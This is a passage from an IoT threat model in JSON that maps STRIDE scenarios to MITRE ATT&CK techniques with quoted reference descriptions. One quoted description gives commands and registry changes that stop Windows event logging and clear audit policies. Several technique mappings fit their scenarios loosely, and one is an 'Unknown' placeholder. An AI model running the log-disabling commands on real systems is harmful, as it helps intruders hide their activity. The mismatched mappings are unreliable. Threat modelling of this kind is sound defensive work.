                },
                {
                    "Assumption": "The IoT system does not enforce multi-factor authentication effectively.",
                    "Role": "System Administrator",
                    "Condition": "Valid if multi-factor authentication is not properly implemented."
                }
            ],
            "Potential Impact": "Unauthorized access compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credential Access",
                "Smart Card",
                "User Impersonation"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses captured biometric data to authenticate as a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is used as an authentication method.",
                    "Role": "User",
                    "Condition": "Valid if biometric data is intercepted or copied."
                },
                {
                    "Assumption": "The attacker has the tools to process and replicate biometric patterns.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has advanced technical capabilities."
                },
                {
                    "Assumption": "The IoT system does not have robust protections against biometric spoofing.",
                    "Role": "System Administrator",
                    "Condition": "Valid if anti-spoofing measures are insufficient."
                }
            ],
            "Potential Impact": "Unauthorized access compromising data confidentiality and system integrity.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Biometric Data",
                "Authentication Bypass",
                "User Impersonation"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sets up a rogue device that mimics legitimate ones to eavesdrop on communication.",
            "Assumptions": [
                {
                    "Assumption": "Devices communicate over wireless networks.",
                    "Role": "System",
                    "Condition": "Valid if wireless networks are not fully secured."
                },
                {
                    "Assumption": "The attacker knows network specifications and wireless communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Valid if system details are leaked or can be deduced."
                },
                {
                    "Assumption": "No robust network authentication and encryption mechanisms are in place.",
                    "Role": "System Administrator",
                    "Condition": "Valid if wireless communication lacks secure protocols."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "Communication Eavesdropping",
                "Rogue Device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters sensor data to falsify environmental conditions.",
            "Assumptions": [
                {
                    "Assumption": "Sensors transmit data over networks.",
                    "Role": "Sensor Network",
                    "Condition": "Valid if sensor data is accessible during transmission."
                },
                {
                    "Assumption": "There are vulnerabilities in the sensor firmware or communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Valid if firmware or protocols are not secured."
                },
                {
                    "Assumption": "There is insufficient validation of sensor data on the IoT system.",
                    "Role": "System Administrator",
                    "Condition": "Valid if the system lacks data validation mechanisms."
                }
            ],
            "Potential Impact": "Compromises data integrity and potentially disrupts system availability.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Sensor Data",
                "Integrity Violation",
                "Firmware Vulnerability"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies actuator firmware to change the behaviors of physical devices.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates for actuators are not cryptographically signed.",
                    "Role": "System Administrator",
                    "Condition": "Valid if firmware updates lack authentication mechanisms."
                },
                {
                    "Assumption": "The attacker has network access to deliver altered firmware.",
                    "Role": "Attacker",
                    "Condition": "Valid if network protections are inadequate."
                },
                {
                    "Assumption": "Actuator devices do not verify the integrity of the firmware.",
                    "Role": "Actuator",
                    "Condition": "Valid if actuators lack integrity verification processes."
                }
            ],
            "Potential Impact": "Compromises system integrity and could lead to physical harm or disruption.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware",
                "Actuator",
                "Integrity Violation"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects false configuration data into the data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories are accessible via network.",
                    "Role": "Database",
                    "Condition": "Valid if database access is exposed."
                },
                {
                    "Assumption": "The attacker has gained necessary access privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker acquires admin credentials."
                },
                {
                    "Assumption": "No strong authentication or authorization controls for data modification.",
                    "Role": "System Administrator",
                    "Condition": "Valid if authentication or authorization is weak."
                }
            ],
            "Potential Impact": "Compromises data integrity and could disable or corrupt functionality.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Injection",
                "Configuration Data",
                "Repository"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having altered system configurations via the user device.",
            "Assumptions": [
                {
                    "Assumption": "User actions are not logged with sufficient detail.",
                    "Role": "System Administrator",
                    "Condition": "Valid if detailed logging is missing or incomplete."
                },
                {
                    "Assumption": "Logs are not adequately protected from tampering.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logs can be accessed and altered."
                },
                {
                    "Assumption": "There is no non-repudiation mechanism in place.",
                    "Role": "System",
                    "Condition": "Valid if there are no mechanisms like digital signatures."
                }
            ],
            "Potential Impact": "Undermines system integrity and auditing; complicates incident investigation.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Logging",
                "Non-repudiation",
                "System Configuration"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies having sent malicious commands to the actuators.",
            "Assumptions": [
                {
                    "Assumption": "Command transactions are not logged or are logged insufficiently.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging lacks detail or is absent."
                },
                {
                    "Assumption": "Logs are not protected against tampering and unauthorized access.",
                    "Role": "System Administrator",
                    "Condition": "Valid if log integrity is not ensured."
                },
                {
                    "Assumption": "No end-to-end verification method to confirm command issuer identity.",
                    "Role": "System",
                    "Condition": "Valid if identity verification mechanisms are weak."
                }
            ],
            "Potential Impact": "Compromises system trust; hinders forensic analysis and response actions.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Logging",
                "Command Injection",
                "Actuator Control"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user or attacker denies access attempts that resulted in data breaches.",
            "Assumptions": [
                {
                    "Assumption": "Access attempts are not logged with complete details.",
                    "Role": "System Administrator",
                    "Condition": "Valid if detailed logging of access attempts is insufficient."
                },
                {
                    "Assumption": "No encryption or digital signing of audit logs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logs are susceptible to tampering."
                },
                {
                    "Assumption": "Weak authentication mechanisms enabling attacker access.",
                    "Role": "System",
                    "Condition": "Valid if authentication protocols are inadequate."
                }
            ],
            "Potential Impact": "Weakens accountability; complicates security management and incident handling.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Access Logs",
                "Data Breach",
                "Authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted during transmission between sensors and the cloud repository.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over insecure channels.",
                    "Role": "System",
                    "Condition": "Valid if data communication lacks encryption."
                },
                {
                    "Assumption": "The attacker has access to the network to perform packet sniffing.",
                    "Role": "Attacker",
                    "Condition": "Valid if network defenses are weak."
                },
                {
                    "Assumption": "Sensitive data is not obfuscated or tokenized during transmission.",
                    "Role": "System Administrator",
                    "Condition": "Valid if no data protection measures are applied."
                }
            ],
            "Potential Impact": "Compromises data confidentiality; exposes sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Transmission",
                "Packet Sniffing",
                "Unencrypted Data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to user profile data stored in the cloud repository.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on cloud storage.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access management is not rigorous."
                },
                {
                    "Assumption": "The attacker has compromised user credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials are phished or otherwise obtained."
                },
                {
                    "Assumption": "Sensitive data within the repository is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if data encryption is not enforced."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user information impacting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Cloud Repository",
                "Access Management",
                "User Profile Data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive system configuration data is leaked to external parties.",
            "Assumptions": [
                {
                    "Assumption": "System configurations are stored in a central repository.",
                    "Role": "System",
                    "Condition": "Valid if configuration data is centrally stored and not isolated."
                },
                {
                    "Assumption": "No adequate access control mechanisms to protect configuration data.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access controls are lacking."
                },
                {
                    "Assumption": "Attacker has sufficient access privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker gains administrative credentials."
                }
            ],
            "Potential Impact": "Compromises confidentiality of system blueprints; exposes configuration vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Configuration Data",
                "Access Control",
                "Data Leak"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication network, disrupting IoT device interactions.",
            "Assumptions": [
                {
                    "Assumption": "Network has limited capacity to handle flooding attacks.",
                    "Role": "System",
                    "Condition": "Valid if network infrastructure is easily overwhelmed."
                },
                {
                    "Assumption": "No adequate DDoS protection mechanisms are deployed.",
                    "Role": "System Administrator",
                    "Condition": "Valid if DDoS defenses are lacking."
                },
                {
                    "Assumption": "The attacker has network access to initiate such an attack.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access is poorly protected."
                }
            ],
            "Potential Impact": "Disrupts system availability and user access to IoT devices.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Network Flooding",
                "Disruption",
                "Availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a bug in the machine learning model, causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "Machine learning models are susceptible to specific input patterns.",
                    "Role": "System",
                    "Condition": "Valid if models lack robustness against malicious inputs."
                },
                {
                    "Assumption": "The attacker can deliver crafted inputs to the model.",
                    "Role": "Attacker",
                    "Condition": "Valid if input channels are not secured or validated."
                },
                {
                    "Assumption": "No input sanitization or anomaly detection mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Valid if input data is not thoroughly checked."
                }
            ],
            "Potential Impact": "Disrupts system decision-making capabilities, reducing overall system availability.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Machine Learning",
                "Input Exploitation",
                "Crashing"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overloads the data repositories with excessive write requests.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories can be overwhelmed by high volume requests.",
                    "Role": "System",
                    "Condition": "Valid if repositories lack rate-limiting mechanisms."
                },
                {
                    "Assumption": "No adequate logging and monitoring of data insert operations.",
                    "Role": "System Administrator",
                    "Condition": "Valid if insert operations are not monitored."
                },
                {
                    "Assumption": "The attacker has some level of access to perform write operations.",
                    "Role": "Attacker",
                    "Condition": "Valid if write access controls are inadequate."
                }
            ],
            "Potential Impact": "Disrupts data availability and potentially causes resource exhaustion.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Data Repository",
                "Resource Overload",
                "Write Request Flooding"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain administrative privileges on the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "System has known vulnerabilities that can be exploited.",
                    "Role": "System",
                    "Condition": "Valid if patches are missing or outdated."
                },
                {
                    "Assumption": "The attacker has access to exploit tools and knowledge.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has advanced technical skills."
                },
                {
                    "Assumption": "No effective privilege escalation protection mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Valid if there is no proper security monitoring."
                }
            ],
            "Potential Impact": "Compromises system integrity and allows unauthorized control over the system.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Vulnerability Exploitation",
                "Administrative Access",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages default credentials to gain higher access rights.",
            "Assumptions": [
                {
                    "Assumption": "Default credentials are used for initial setup and never changed.",
                    "Role": "System Administrator",
                    "Condition": "Valid if system hardening processes are neglected."
                },
                {
                    "Assumption": "The attacker has initial access to the system to try default credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if the system is exposed and minimally protected."
                },
                {
                    "Assumption": "No account lockout policies for repeated unauthorized access attempts.",
